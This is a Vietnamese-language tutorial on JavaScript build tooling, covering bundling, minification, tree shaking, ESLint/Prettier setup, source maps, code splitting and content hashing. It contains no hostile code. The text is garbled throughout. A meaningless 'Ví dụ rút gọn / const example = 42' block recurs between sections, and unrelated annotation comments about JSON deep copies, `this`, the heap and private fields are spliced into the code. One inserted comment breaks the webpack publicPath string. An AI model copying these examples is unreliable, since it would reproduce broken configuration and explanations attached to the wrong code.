      const response = await fetch('/api/data');
      const data = await response.json();
      return utils.add(data.count, 10);
    }
  };

 // Chú giải: Module: index.js (Entry)
  async function main() {
    const result = await api.fetchData();
    const final = utils.subtract(result, 5);
    console.log(final);
  }

  main();
})();

 // Chú giải: ✅ Tất cả code trong 1 file!
// ✅ Modules được wrap trong function scope (tránh global pollution)
// ✅ Dependencies được resolve (utils, api, index)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ===================================================
// 📝 TRƯỚC MINIFY - Code dễ đọc (10 KB)
 // Chú giải: ===================================================

// Original code (readable - dễ đọc)
function calculateTotalPrice(items, taxRate, discount) {
  // Calculate subtotal - Tính tổng tiền hàng
  let subtotal = 0;

  for (let i = 0; i < items.length; i++) {
    const item = items[i];
    subtotal += item.price * item.quantity;
  }

  // Apply discount - Áp dụng giảm giá
  const discountedPrice = subtotal * (1 - discount / 100);

  // Add tax - Thêm thuế
  const tax = discountedPrice * (taxRate / 100);
  const total = discountedPrice + tax;

  return total;
}

 // Chú giải: Exported function for external use
export { calculateTotalPrice };

 // Chú giải: ===================================================
// 🗜️ SAU MINIFY - Code khó đọc nhưng NHỎ (3 KB)
 // Chú giải: ===================================================

// Minified code (unreadable - khó đọc nhưng nhỏ)
function c(a,b,d){let e=0;for(let f=0;f<a.length;f++){const g=a[f];e+=g.price*g.quantity}const h=e*(1-d/100),i=h*(b/100);return h+i}export{c};

// 🎯 NHỮNG GÌ ĐÃ THAY ĐỔI:
// ✅ Remove comments (// Calculate subtotal, etc.) → Tiết kiệm ~200 bytes
// ✅ Remove whitespace (spaces, tabs) → Tiết kiệm ~500 bytes
// ✅ Remove newlines → Tiết kiệm ~300 bytes
 // Chú giải: ✅ Shorten variable names:
 // Chú giải: - calculateTotalPrice → c
 // Chú giải: - items → a
 // Chú giải: - taxRate → b
 // Chú giải: - discount → d
 // Chú giải: - subtotal → e
 // Chú giải: - item → g
 // Chú giải: - discountedPrice → h
 // Chú giải: - tax → i
// ✅ Remove unnecessary semicolons, braces → Tiết kiệm ~50 bytes
//
// 📊 KẾT QUẢ: 10 KB → 3 KB (Giảm 70%!)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ===================================================
// 🔧 KỸ THUẬT 1: Remove Whitespace & Comments
 // Chú giải: ===================================================

 // Chú giải: Before (với whitespace, comments)
function add(a, b) {
 // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
  return a + b; // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
}

 // Chú giải: After (remove whitespace, comments)
function add(a,b){return a+b}

// Tiết kiệm: ~50 bytes

 // Chú giải: ===================================================
// 🔧 KỸ THUẬT 2: Shorten Variable Names (Mangle)
 // Chú giải: ===================================================

// Before (tên biến dài, có nghĩa)
function calculateUserTotalScore(userAnswers, correctAnswers) {
  let totalScore = 0;
  for (let index = 0; index < userAnswers.length; index++) {
    if (userAnswers[index] === correctAnswers[index]) {
      totalScore += 10;
    }
  }
  return totalScore;
}

// After (tên biến ngắn - 1 ký tự)
function c(a,b){let d=0;for(let e=0;e<a.length;e++){if(a[e]===b[e]){d+=10}}return d}

// Tiết kiệm: ~100 bytes

// ⚠️ LƯU Ý: Chỉ mangle LOCAL variables
// KHÔNG mangle exported names (để external code gọi được)

 // Chú giải: ===================================================
// 🔧 KỸ THUẬT 3: Optimize Boolean Logic
 // Chú giải: ===================================================

 // Chú giải: Before
if (user.isActive === true) {
  console.log('Active');
}

 // Chú giải: After
if(user.isActive)console.log('Active')

 // Chú giải: Before
const value = condition ? true : false;

 // Chú giải: After
const value = !!condition; // Hoặc: value = condition

 // Chú giải: ===================================================
// 🔧 KỸ THUẬT 4: Dead Code Elimination
 // Chú giải: ===================================================

 // Chú giải: Before
function process(data) {
  const temp = data * 2; // ❌ temp không dùng
  const result = data + 10;
  return result;
}

 // Chú giải: After (remove unused variable)
function process(a){return a+10}

 // Chú giải: ===================================================
// 🔧 KỸ THUẬT 5: Constant Folding (Gộp hằng số)
 // Chú giải: ===================================================

 // Chú giải: Before
const total = 10 + 20 + 30; // Tính lúc runtime

 // Chú giải: After
const total = 60; // Tính lúc build time

 // Chú giải: Before
const area = Math.PI * 5 * 5; // Tính lúc runtime

 // Chú giải: After
const area = 78.53981633974483; // Tính sẵn lúc build

 // Chú giải: ===================================================
// 🔧 KỸ THUẬT 6: Property Mangling (Advanced)
 // Chú giải: ===================================================

 // Chú giải: Before
const user = {
  firstName: 'John',
  lastName: 'Doe',
  calculateAge: function() { return 2024 - this.birthYear; }
};

 // Chú giải: After (mangle property names - CẨN THẬN!)
const user = {
  a: 'John', // Chú giải: firstName → a
  b: 'Doe', // Chú giải: lastName → b
  c: function() { return 2024 - this.d; } // Chú giải: calculateAge → c
};

// ⚠️ NGUY HIỂM: Nếu external code access user.firstName → BỊ LỖI!
// → Chỉ dùng khi chắc chắn property KHÔNG được access từ bên ngoài

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────┐
│           MINIFY IMPACT (Ảnh hưởng của Minify)          │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  📦 React App Example (Production build):               │
│                                                          │
│  BEFORE Minify:                                         │
│  ├── main.js:          850 KB (code dễ đọc)            │
│  ├── vendor.js:        1.2 MB (libraries)              │
│  └── Total:            2.05 MB                          │
│                                                          │
│  AFTER Minify:                                          │
│  ├── main.min.js:      280 KB (67% nhỏ hơn!) ✅        │
│  ├── vendor.min.js:    420 KB (65% nhỏ hơn!) ✅        │
│  └── Total:            700 KB                           │
│                                                          │
│  AFTER Minify + Gzip:                                   │
│  ├── main.min.js.gz:   95 KB (89% nhỏ hơn!) 🚀         │
│  ├── vendor.min.js.gz: 145 KB (88% nhỏ hơn!) 🚀        │
│  └── Total:            240 KB                           │
│                                                          │
│  ⏱️ Load Time Impact (3G network ~400 KB/s):           │
│  ├── Before: 2.05 MB ÷ 400 KB/s = 5.1 giây ❌          │
│  ├── After Minify: 700 KB ÷ 400 KB/s = 1.75 giây ✅    │
│  └── After Minify+Gzip: 240 KB ÷ 400 KB/s = 0.6 giây 🚀│
│                                                          │
│  📈 Cải thiện: Nhanh hơn 8.5x!                          │
└──────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ===================================================
// 📦 LIBRARY: math-utils.js (Thư viện toán học)
 // Chú giải: ===================================================

// Export 10 functions (nhưng app chỉ dùng 2)
export function add(a, b) {
  return a + b;
}

export function subtract(a, b) {
  return a - b;
}

export function multiply(a, b) {
  return a * b;
}

export function divide(a, b) {
  return a / b;
}

export function power(a, b) {
  return Math.pow(a, b);
}

export function sqrt(a) {
  return Math.sqrt(a);
}

export function abs(a) {
  return Math.abs(a);
}

export function round(a) {
  return Math.round(a);
}

export function floor(a) {
  return Math.floor(a);
}

export function ceil(a) {
  return Math.ceil(a);
}

 // Chú giải: ===================================================
// 📱 APP: index.js (Chỉ dùng 2 functions)
 // Chú giải: ===================================================

import { add, subtract } from './math-utils.js';
 // Chú giải: ↑      ↑
 // Chú giải: Chỉ import 2 functions (add, subtract)
//       8 functions còn lại KHÔNG import

const result1 = add(10, 20);        // ✅ Dùng add
const result2 = subtract(50, 30);   // ✅ Dùng subtract

console.log(result1, result2);

 // Chú giải: ===================================================
// 🌲 TREE SHAKING RESULT (Kết quả sau tree shake)
 // Chú giải: ===================================================

// ❌ KHÔNG DÙNG Tree Shaking:
// Bundle chứa TẤT CẢ 10 functions (kể cả 8 functions không dùng)
 // Chú giải: Bundle size: ~2 KB

// ✅ DÙNG Tree Shaking:
 // Chú giải: Bundle CHỈ chứa 2 functions (add, subtract)
// 8 functions còn lại bị LOẠI BỎ hoàn toàn
 // Chú giải: Bundle size: ~400 bytes

// 📊 Giảm 80% kích thước! 🚀

```js
// Ví dụ rút gọn
const example = 42;
```

┌──────────────────────────────────────────────────────────┐
│         TREE SHAKING PROCESS (Quy trình rũ cây)          │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  🌳 STEP 1: Build Dependency Tree (Xây cây phụ thuộc)  │
│                                                          │
│         index.js (Entry)                                │
│            │                                             │
│            ├─ import { add, subtract } from math-utils  │
│            │                                             │
│         math-utils.js                                   │
│            ├─ export add ✅ (USED - được dùng)          │
│            ├─ export subtract ✅ (USED - được dùng)     │
│            ├─ export multiply ❌ (UNUSED - không dùng)  │
│            ├─ export divide ❌ (UNUSED)                 │
│            ├─ export power ❌ (UNUSED)                  │
│            ├─ export sqrt ❌ (UNUSED)                   │
│            ├─ export abs ❌ (UNUSED)                    │
│            ├─ export round ❌ (UNUSED)                  │
│            ├─ export floor ❌ (UNUSED)                  │
│            └─ export ceil ❌ (UNUSED)                   │
│                                                          │
│  ✂️ STEP 2: Mark Unused Exports (Đánh dấu không dùng)  │
│  ├── Scan tất cả imports trong app                     │
│  ├── Đánh dấu exports nào được import                  │
│  └── Exports KHÔNG được import = UNUSED (thừa)         │
│                                                          │
│  🗑️ STEP 3: Remove Dead Code (Xóa code thừa)          │
│  ├── Loại bỏ 8 functions không dùng                    │
│  ├── Chỉ giữ lại add và subtract                       │
│  └── Bundle size: 2 KB → 400 bytes                     │
│                                                          │
│  ✅ OUTPUT: Optimized bundle (Bundle tối ưu)           │
│  └── Chỉ chứa code THỰC SỰ được dùng                   │
└──────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ===================================================
// ✅ YÊU CẦU 1: Dùng ES Modules (import/export)
 // Chú giải: ===================================================

// ✅ GOOD: ES Modules - Tree shaking hoạt động
export function add(a, b) {
  return a + b;
}

import { add } from './utils.js';

// ❌ BAD: CommonJS - Tree shaking KHÔNG hoạt động
module.exports = {
  add: function(a, b) { return a + b; }
};

const { add } = require('./utils.js');

 // Chú giải: 🔍 TẠI SAO?
// ES Modules: Static imports (biết lúc build time exports nào được dùng)
// CommonJS: Dynamic requires (chỉ biết lúc runtime → không tree shake được)

 // Chú giải: ===================================================
// ✅ YÊU CẦU 2: sideEffects: false trong package.json
 // Chú giải: ===================================================

 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "name": "my-library",
  "sideEffects": false, // ✅ Báo: "Safe to remove unused exports"
}

// Hoặc chỉ định files có side-effects:
{
  "sideEffects": [
    "*.css",           // CSS files có side-effects (apply styles globally)
    "*.scss",
    "./src/polyfills.ts" // Polyfills có side-effects (modify globals)
  ]
}

// 🔍 SIDE-EFFECTS LÀ GÌ?
// Code có tác dụng phụ khi import (không chỉ export functions/classes)

// ❌ Code có side-effects (KHÔNG tree shake được):
 // Chú giải: logger.js
console.log('Logger initialized'); // Chú giải: ⚠️ Side-effect: console.log khi import
window.logger = { log: (msg) => console.log(msg) }; // Chú giải: ⚠️ Modify global

export function log(message) {
  console.log(message);
}

 // Chú giải: App import logger:
import { log } from './logger.js';
// → logger.js được execute ngay lập tức
 // Chú giải: → console.log('Logger initialized') chạy
// → window.logger được tạo
// → Bundler KHÔNG DÁM xóa code này (vì có side-effects)

// ✅ Code KHÔNG có side-effects (tree shake được):
 // Chú giải: math.js
export function add(a, b) {
  return a + b; // ✅ Pure function - không side-effects
}

 // Chú giải: ===================================================
// ✅ YÊU CẦU 3: Named Exports (không dùng default export)
 // Chú giải: ===================================================

// ❌ BAD: Default export + destructuring → Tree shake KÉM
 // Chú giải: utils.js
export default {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b,
};

 // Chú giải: app.js
import utils from './utils.js';
const result = utils.add(1, 2);
// 🚨 Bundler phải include TOÀN BỘ object (vì không biết property nào được dùng)

 // Chú giải: ✅ GOOD: Named exports → Tree shake TỐT
 // Chú giải: utils.js
export const add = (a, b) => a + b;
export const subtract = (a, b) => a - b;
export const multiply = (a, b) => a * b;

 // Chú giải: app.js
import { add } from './utils.js';
const result = add(1, 2);
// ✅ Bundler chỉ include add, loại bỏ subtract và multiply

 // Chú giải: ===================================================
 // Chú giải: ❌ ANTI-PATTERN: Barrel Exports (Re-exports)
 // Chú giải: ===================================================

 // Chú giải: ❌ BAD: Barrel file (index.js) re-export tất cả
 // Chú giải: index.js
export * from './moduleA'; // Chú giải: Re-export tất cả từ moduleA
export * from './moduleB';
export * from './moduleC';

 // Chú giải: app.js
import { funcA } from './index.js'; // Chú giải: Import từ barrel
 // Chú giải: 🚨 Bundler phải load TẤT CẢ modules (A, B, C)
// Vì barrel file có thể có side-effects

// ✅ GOOD: Import trực tiếp
import { funcA } from './moduleA.js';
// ✅ Chỉ load moduleA, không load B và C

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ===================================================
// 📦 VÍ DỤ THỰC TẾ: Lodash Library
 // Chú giải: ===================================================

// ❌ BAD: Import toàn bộ Lodash (~70 KB!)
import _ from 'lodash';

const result = _.uniq([1, 2, 2, 3]);
// 🚨 Bundle bao gồm TOÀN BỘ Lodash (300+ functions)
 // Chú giải: → Bundle size: +70 KB

// ✅ GOOD: Import chỉ function cần dùng
import uniq from 'lodash/uniq'; // Chú giải: Chỉ import uniq function

const result = uniq([1, 2, 2, 3]);
 // Chú giải: ✅ Bundle chỉ bao gồm uniq function (~2 KB)
 // Chú giải: → Bundle size: +2 KB

// 📊 Tiết kiệm: 68 KB! (97% nhỏ hơn)

// ✅ BETTER: Dùng lodash-es (ES Modules version)
import { uniq } from 'lodash-es';
// → Tree shaking tự động loại bỏ functions không dùng

```js
// Ví dụ rút gọn
const example = 42;
```

┌─────────────────────────────────────────────────────────────┐
│              COMPLETE TOOLING WORKFLOW                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. DEVELOPMENT (ESLint + Prettier)                        │
│  ┌──────────────────────────────────────┐                  │
│  │  Write modern code (ES2020+, TS)    │                  │
│  │    ↓                                 │                  │
│  │  ESLint check (errors, warnings)    │                  │
│  │    ↓                                 │                  │
│  │  Prettier format (auto-fix)         │                  │
│  │    ↓                                 │                  │
│  │  Clean, consistent code ✅           │                  │
│  └──────────────────────────────────────┘                  │
│                                                             │
│  2. BUILD PROCESS (Full Pipeline)                         │
│  ┌──────────────────────────────────────┐                  │
│  │  Source: 100 files, 500 KB, ES2020  │                  │
│  │    ↓                                 │                  │
│  │  TRANSPILING (Babel/TypeScript)     │                  │
│  │  - ES2020 → ES5 (arrow fn → fn)    │                  │
│  │  - TypeScript → JavaScript          │                  │
│  │  - JSX → JavaScript                 │                  │
│  │    ↓                                 │                  │
│  │  POLYFILLING (core-js)              │                  │
│  │  - Add Promise, fetch, Array.from   │                  │
│  │  - Only import used polyfills       │                  │
│  │    ↓                                 │                  │
│  │  Transpiled: 100 files, 550 KB, ES5│                  │
│  │    ↓                                 │                  │
│  │  BUNDLING (Webpack/Vite)            │                  │
│  │  - Gộp 100 files → 1 file           │                  │
│  │  - Resolve dependencies             │                  │
│  │    ↓                                 │                  │
│  │  Bundle: 1 file, 550 KB             │                  │
│  │    ↓                                 │                  │
│  │  TREE-SHAKING (Remove dead code)   │                  │
│  │  - Analyze imports/exports          │                  │
│  │  - Remove unused functions          │                  │
│  │    ↓                                 │                  │
│  │  Optimized: 1 file, 300 KB ✅       │                  │
│  │    ↓                                 │                  │
│  │  MINIFY (Terser/esbuild)            │                  │
│  │  - Remove whitespace, comments      │                  │
│  │  - Shorten variable names           │                  │
│  │    ↓                                 │                  │
│  │  Minified: 1 file, 100 KB ✅        │                  │
│  │    ↓                                 │                  │
│  │  CODE SPLITTING (Dynamic imports)   │                  │
│  │  - Split by routes/components       │                  │
│  │  - Vendor chunk (React, libs...)    │                  │
│  │    ↓                                 │                  │
│  │  Final Output:                       │                  │
│  │  - main.js (30KB) - App logic       │                  │
│  │  - vendor.js (40KB) - Libraries     │                  │
│  │  - lazy-1.js (15KB) - Route 1       │                  │
│  │  - lazy-2.js (15KB) - Route 2       │                  │
│  │  Total: 100KB (split into 4 chunks)│                  │
│  └──────────────────────────────────────┘                  │
│                                                             │
│  3. PRODUCTION (Source Maps + Differential Serving)       │
│  ┌──────────────────────────────────────┐                  │
│  │  Modern browsers:                    │                  │
│  │  - Load modern.js (ES2020, 80KB)    │                  │
│  │  - No polyfills needed              │                  │
│  │    ↓                                 │                  │
│  │  Old browsers (IE11):               │                  │
│  │  - Load legacy.js (ES5, 100KB)     │                  │
│  │  - Includes polyfills               │                  │
│  │    ↓                                 │                  │
│  │  Debug với Source Maps:             │                  │
│  │  - app.min.js + app.min.js.map     │                  │
│  │  - DevTools shows original code ✅   │                  │
│  └──────────────────────────────────────┘                  │
│                                                             │
│  📊 OPTIMIZATION RESULTS:                                  │
│  - Original: 500 KB (ES2020, 100 files, readable)        │
│  - Modern: 80 KB (ES2020, minified, split) - 84% smaller │
│  - Legacy: 100 KB (ES5, polyfills, split) - 80% smaller  │
│  - Initial load: 30 KB main.js - 94% smaller! 🚀         │
└─────────────────────────────────────────────────────────────┘

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ============================================
 // Chú giải: 1. ESLint + Prettier Configuration
 // Chú giải: ============================================

 // Chú giải: .eslintrc.js
module.exports = {
  root: true,
  parser: '@typescript-eslint/parser',
  parserOptions: {
    ecmaVersion: 2022,
    sourceType: 'module',
    project: './tsconfig.json'
  },
  plugins: ['@typescript-eslint', 'react', 'react-hooks'],
  extends: [
    'eslint:recommended', // Chú giải: ESLint base rules
    'plugin:@typescript-eslint/recommended', // Chú giải: TypeScript rules
    'plugin:react/recommended', // Chú giải: React rules
    'plugin:react-hooks/recommended', // Chú giải: React Hooks rules
    'prettier' // Chú giải: Disable formatting rules (conflict với Prettier)
  ],
  rules: {
 // Chú giải: Customize rules
    '@typescript-eslint/no-unused-vars': 'error',  // ❌ Error khi có unused vars
    '@typescript-eslint/explicit-function-return-type': 'warn', // ⚠️ Warning khi không có return type
    'react/prop-types': 'off',                     // ✅ Tắt (vì dùng TypeScript)
    'no-console': 'warn', // Chú giải: ⚠️ Warning với console.log
  }
};

 // Chú giải: .prettierrc.js
module.exports = {
  semi: true,                    // Thêm semicolon
  singleQuote: true,             // Dùng single quotes
  tabWidth: 2, // Chú giải: 2 spaces
  trailingComma: 'es5', // Chú giải: Trailing comma cho ES5
  printWidth: 100, // Chú giải: Max line length
  arrowParens: 'avoid',          // (x) => x thay vì (x) => x
  endOfLine: 'lf' // Chú giải: Unix line endings
};

 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "scripts": {
    "lint": "eslint . --ext .ts,.tsx", // Chú giải: Check lỗi
    "lint:fix": "eslint . --ext .ts,.tsx --fix", // Chú giải: Auto-fix lỗi
    "format": "prettier --write \"**/*.{ts,tsx,json}\"", // Chú giải: Format code
    "format:check": "prettier --check \"**/*.{ts,tsx,json}\"" // Chú giải: Check format
  }
}

 // Chú giải: ============================================
 // Chú giải: 2. Source Maps Configuration
 // Chú giải: ============================================

 // Chú giải: webpack.config.js
module.exports = {
  mode: 'production',

 // Chú giải: 🗺️ Source maps cho production
  devtool: 'source-map', // Tạo file .map riêng

 // Chú giải: Alternative options:
  // devtool: 'hidden-source-map' → Không reference trong bundle (bảo mật hơn)
 // Chú giải: devtool: 'eval-source-map'   → Development (rebuild nhanh)
 // Heap lưu object và mảng; được runtime quản lý bởi trình thu gom rác.

  output: {
    filename: '[name].[contenthash].js',
    path: path.resolve(__dirname, 'dist'),

 // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
    sourceMapFilename: '[file].map',
    publicPath: 'https: // Chú giải: sourcemaps.example.com/'
  }
};

 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "compilerOptions": {
    "sourceMap": true, // Chú giải: Generate .map files cho TypeScript
    "inlineSources": true // Chú giải: Include source code trong .map (debugging easier)
  }
}

 // Chú giải: 🎯 Sử dụng: Debug trong browser
 // Chú giải: 1. Open DevTools
// 2. Source maps tự động load
 // Chú giải: 3. Set breakpoint trong ORIGINAL TypeScript code
// 4. Xem variables với original names (không bị minified)

 // Chú giải: ============================================
 // Chú giải: 3. Tree-shaking Setup
 // Chú giải: ============================================

 // Dùng `JSON.parse(JSON.stringify(obj))` là hack sao chép sâu nhưng sẽ mất hàm, `Date`, `undefined`, symbol, v.v.
{
  "name": "my-app",
  "sideEffects": false, // ✅ Báo cho bundler: "safe to remove unused exports"

  // Hoặc specify files có side-effects:
 // Chú giải: "sideEffects": ["*.css", "*.scss", "./src/polyfills.ts"]
}

 // Chú giải: ✅ GOOD: Named exports cho tree-shaking
 // Chú giải: utils.ts
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

export function multiply(a: number, b: number): number {
  return a * b;
}

 // Chú giải: app.ts
import { add } from './utils'; // Chú giải: ✅ Chỉ import add

console.log(add(2, 3));

 // Chú giải: 🌲 Tree-shaking result:
// subtract() và multiply() BỊ LOẠI BỎ khỏi bundle!
 // Chú giải: Bundle chỉ chứa add() → nhỏ hơn

// ❌ BAD: Default export + namespace import → tree-shaking KÉM
 // Chú giải: utils.ts
export default {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b
};

 // Chú giải: app.ts
import utils from './utils'; // Chú giải: ❌ Import CẢ object
console.log(utils.add(2, 3));
// 🚨 Tree-shaking KHÔNG hoạt động!
// Bundle chứa cả subtract, multiply (dù không dùng)

 // Chú giải: ❌ BAD: Barrel exports với side-effects
 // Chú giải: index.ts (barrel file)
export * from './moduleA'; // ❌ Nếu moduleA có side-effects
export * from './moduleB';
export * from './moduleC';

 // Chú giải: app.ts
import { funcA } from './index'; // Chú giải: Import from barrel
 // Chú giải: 🚨 Bundler phải load TẤT CẢ modules (A, B, C)
// Vì không biết module nào có side-effects

// ✅ GOOD: Import trực tiếp
import { funcA } from './moduleA'; // Chú giải: ✅ Chỉ load moduleA

 // Chú giải: ============================================
 // Chú giải: 4. Code Splitting
 // Chú giải: ============================================

 // Chú giải: 📍 A. Route-based Code Splitting (React Router)
import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

 // Chú giải: ✅ Lazy load route components
const Home = lazy(() => import('./pages/Home')); // Chú giải: home.chunk.js
const Dashboard = lazy(() => import('./pages/Dashboard')); // Chú giải: dashboard.chunk.js
const Profile = lazy(() => import('./pages/Profile')); // Chú giải: profile.chunk.js

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/profile" element={<Profile />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// 🎯 Kết quả:
 // Chú giải: - Initial load: Chỉ load main.js + home.chunk.js
// - User vào /dashboard → Load dashboard.chunk.js on-demand
// - User vào /profile → Load profile.chunk.js on-demand

 // Chú giải: 📦 B. Component-based Code Splitting
 // Chú giải: Heavy component (Chart library)
const ChartComponent = lazy(() => import('./components/Chart'));

function Dashboard() {
  const [showChart, setShowChart] = React.useState(false);

  return (
    <div>
      <button onClick={() => setShowChart(true)}>Show Chart</button>

      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <ChartComponent /> {/* Load khi click button */}
        </Suspense>
      )}
    </div>
  );
}

// 🎯 Lợi ích: Chart library (VD: 500KB) chỉ load khi user click

 // Chú giải: 🔧 C. Dynamic Import (Vanilla JS)
async function loadHeavyModule() {
  const module = await import('./heavy-module'); // Chú giải: Load on-demand
  module.doSomething();
}

 // Chú giải: Example: Load trading calculator khi cần
document.getElementById('calculate-btn')?.addEventListener('click', async () => {
 // Chú giải: Load calculator module (chứa complex math logic)
  const { calculateProfit } = await import('./trading-calculator');

  const result = calculateProfit(100, 150);
  console.log(result);
});

 // Chú giải: 📊 D. Vendor Splitting (Webpack)
 // Chú giải: webpack.config.js
module.exports = {
  optimization: {
    splitChunks: {
      chunks: 'all',
      cacheGroups: {
        // Tách React vào vendor chunk
        vendor: {
          test: /[\\/]node_modules[\\/](react|react-dom)[\\/]/,
          name: 'vendor',
          priority: 10
        },
        // Tách libraries khác
        libs: {
          test: /[\\/]node_modules[\\/]/,
          name: 'libs',
          priority: 5
        }
      }
    }
  }
};

// 🎯 Kết quả:
// - vendor.js (React + ReactDOM) → cache lâu dài (ít thay đổi)
// - libs.js (Lodash, Axios...) → cache lâu dài
// - main.js (App code) → thay đổi thường xuyên

 // Chú giải: ============================================
 // Chú giải: 5. Content Hashing (Hash File) - Cache Busting
 // Chú giải: ============================================

/**
 * 🔐 CONTENT HASHING LÀ GÌ? (What is Content Hashing?)
 *
 * Content Hashing là kỹ thuật thêm HASH (chuỗi ký tự duy nhất) vào tên file
 * dựa trên NỘI DUNG của file. Khi nội dung thay đổi → hash thay đổi → tên file mới.
 *
 * 🎯 MỤC ĐÍCH:
 * ✅ Cache Busting: Bắt buộc browser tải file mới khi code thay đổi
 * ✅ Long-term Caching: Cache files không đổi vô thời hạn (1 năm)
 * ✅ Performance: Giảm requests cho files không đổi
 */

 // Chú giải: ===================================================
// 🔥 VẤN ĐỀ: KHÔNG DÙNG HASH (The Problem)
 // Chú giải: ===================================================

 // Chú giải: Build #1 (Version 1.0 - Thứ 2)
 // Chú giải: dist/
//   ├── main.js        (100 KB) ← Tên file KHÔNG ĐỔI
//   └── vendor.js      (300 KB) ← Tên file KHÔNG ĐỔI

 // Chú giải: index.html
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.js"></script>     ← Browser cache file này
  <script src="/vendor.js"></script>   ← Browser cache file này
</head>
</html>
*/

 // Chú giải: 🚨 SCENARIO:
 // Chú giải: 1. User A visit website → Download main.js, vendor.js
// 2. Browser cache với header: Cache-Control: max-age=31536000 (1 năm)
 // Chú giải: 3. Developer deploy version mới (Thứ 3)
 // Chú giải: → main.js code mới (fix bug)
//    → Nhưng TÊN FILE VẪN LÀ main.js ❌

 // Chú giải: Build #2 (Version 1.1 - Thứ 3 - FIX BUG)
 // Chú giải: dist/
//   ├── main.js        (105 KB) ← Nội dung MỚI, tên file CŨ ❌
//   └── vendor.js      (300 KB) ← Không đổi

 // Chú giải: 4. User A quay lại website
//    → Browser dùng main.js từ CACHE (version cũ) ❌
//    → User KHÔNG thấy bug fix! 😱
//    → Phải Ctrl+F5 (hard refresh) để tải file mới

// ❌ VẤN ĐỀ:
// - User thấy version cũ (có bug)
 // Chú giải: - Phải hard refresh manually
// - Không kiểm soát được cache

 // Chú giải: ===================================================
// ✅ GIẢI PHÁP: CONTENT HASHING
 // Chú giải: ===================================================

 // Chú giải: Build #1 (Version 1.0 - Thứ 2)
 // Chú giải: dist/
 // Chú giải: ├── main.a3f8b2c1.js     (100 KB) ← Hash từ NỘI DUNG
 // Chú giải: └── vendor.9d4e7f1a.js   (300 KB) ← Hash từ NỘI DUNG

 // Chú giải: index.html (auto-generated)
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.a3f8b2c1.js"></script>     ← Tên file có hash
  <script src="/vendor.9d4e7f1a.js"></script>   ← Tên file có hash
</head>
</html>
*/

 // Chú giải: Browser cache:
// - main.a3f8b2c1.js: cached 1 năm ✅
// - vendor.9d4e7f1a.js: cached 1 năm ✅

 // Chú giải: Build #2 (Version 1.1 - Thứ 3 - FIX BUG)
 // Chú giải: dist/
//   ├── main.f7c5d3a9.js     (105 KB) ← HASH MỚI vì nội dung đổi! ✅
//   └── vendor.9d4e7f1a.js   (300 KB) ← HASH CŨ vì nội dung KHÔNG đổi ✅

 // Chú giải: index.html (auto-generated)
/*
<!DOCTYPE html>
<html>
<head>
  <script src="/main.f7c5d3a9.js"></script>     ← Tên file MỚI! ✅
  <script src="/vendor.9d4e7f1a.js"></script>   ← Tên file CŨ (from cache) ✅
</head>
</html>
*/

 // Chú giải: User A quay lại website:
// 1. Browser fetch index.html (luôn fresh, không cache)
// 2. Browser thấy main.f7c5d3a9.js (tên MỚI!)
//    → Tải file mới (vì chưa có trong cache) ✅
// 3. Browser thấy vendor.9d4e7f1a.js (tên CŨ)
//    → Dùng từ cache (tiết kiệm 300 KB bandwidth) ✅

// ✅ LỢI ÍCH:
// - User LUÔN thấy version mới (tự động)
// - Không cần hard refresh
// - Cache files không đổi vô thời hạn (vendor.js)
// - Chỉ download files đã thay đổi (main.js)

 // Chú giải: ===================================================
// 🔧 CÁCH HOẠT ĐỘNG CỦA CONTENT HASHING
 // Chú giải: ===================================================

/**
 * QUY TRÌNH TẠO HASH:
 *
 * 1. Bundler đọc NỘI DUNG file (main.js)
 * 2. Chạy hashing algorithm (MD5, SHA-256, etc.) trên nội dung
 * 3. Tạo hash string (VD: a3f8b2c1d5e9f7a2)
 * 4. Lấy 8 ký tự đầu (a3f8b2c1) để tên file ngắn gọn
 * 5. Rename file: main.js → main.a3f8b2c1.js
 * 6. Update index.html với tên file mới
 */

// Ví dụ minh họa:
const crypto = require('crypto');
const fs = require('fs');

// Đọc nội dung file
const fileContent = fs.readFileSync('dist/main.js', 'utf-8');

 // Chú giải: Tạo hash từ nội dung (MD5)
const hash = crypto
  .createHash('md5')              // Dùng MD5 algorithm
  .update(fileContent) // Chú giải: Hash nội dung file
  .digest('hex') // Chú giải: Convert sang hex string
  .substring(0, 8);               // Lấy 8 ký tự đầu

console.log(hash); // Chú giải: "a3f8b2c1"

 // Chú giải: Rename file
const newFileName = `main.${hash}.js`; // Chú giải: "main.a3f8b2c1.js"

 // Chú giải: ===================================================
